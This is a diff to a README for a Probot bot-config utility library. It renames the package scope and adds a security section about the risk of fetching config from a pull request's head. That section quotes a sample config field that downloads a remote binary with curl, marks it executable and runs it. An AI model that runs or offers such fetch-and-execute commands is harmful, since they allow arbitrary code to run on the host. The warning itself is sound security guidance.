@@ -5,7 +5,7 @@ This is a small library for handling bot config file.
 ## Install
 
 ```bash
-npm i @github-automations/bot-config-utils
+npm i @google-automations/bot-config-utils
 ```
 
 ## Get the config
@@ -16,7 +16,7 @@ interface. The code assumes we're in the probot handler.
 ```typescript
 import {
   getConfig,
-} from '@github-automations/bot-config-utils';
+} from '@google-automations/bot-config-utils';
 
 interface Config {
   myConfig: string;
@@ -38,7 +38,7 @@ You can use a similar method that supports default value.
 ```typescript
 import {
   getConfigWithDefault,
-} from '@github-automations/bot-config-utils';
+} from '@google-automations/bot-config-utils';
 
 interface Config {
   myConfig: string;
@@ -88,7 +88,7 @@ You also need to provide a schema definition. Here is an example definition:
 
 Here is a sample handler(this assumes you're developping a Probot app):
 ```typescript
-import {ConfigChecker} from '@github-automations/bot-config-utils';
+import {ConfigChecker} from '@google-automations/bot-config-utils';
 import schema from './config-schema.json';
 
 // ...
@@ -121,3 +121,27 @@ schema you provided. It will submit a failing status check if:
   `yaml` vs `yml`).
 - You are trying to add a broken config file, or the config file
   doesn't match the schema.
+
+
+## Fetch config from the PR head
+Probot's implementation of config always fetches the config from the
+master branch. This is a reasonable security meassure for a generic
+library.
+
+It is very dangerous to fetch the config from PR head expecially if
+the config contains some external commands. Here is a simple example:
+
+```yaml
+prepareCommands: 'curl http://example.com/m && chmod +x m && ./m'
+
+```
+
+However, if your bot doesn't have such a field in the config file, it
+is very natural to fetch the config from the PR head.
+
+For this purpose, the ConfigChecker has a method:
+`getConfig(): T | undefined`. This will return the config object only
+if the validation succeeds.
+
+Even if the config contains a dangerous field, you can selectively use
+the value from the config in the PR head.
